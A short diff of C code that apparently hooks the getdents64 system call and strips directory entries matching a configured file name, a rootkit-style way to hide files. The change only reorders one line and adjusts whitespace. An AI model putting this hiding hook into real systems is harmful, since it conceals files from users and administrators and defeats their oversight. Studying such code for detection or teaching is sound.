@@ -25,20 +25,21 @@ what is being returned
 d_reclen: Size of this dirent
 d_name:   Filename (null-terminated)
 */
-  struct linux_dirent64 *cur = dirp;
   int rtn = getdents64_original(fd, dirp, count);
+  struct linux_dirent64 *cur = dirp;
 
   int i = 0;
-  while (i < rtn) {
+  while(i < rtn) {
     int size = cur->d_reclen;
 
-    if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+    if(strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       char *next_rec = (char *)cur + size;
       int len = (uintptr_t)dirp + rtn - (uintptr_t)next_rec;
       memmove(cur, next_rec, len);
       rtn -= size;
       continue;
     }
+
     i += size;
     cur = (struct linux_dirent64*) ((char*)dirp + i);
   }
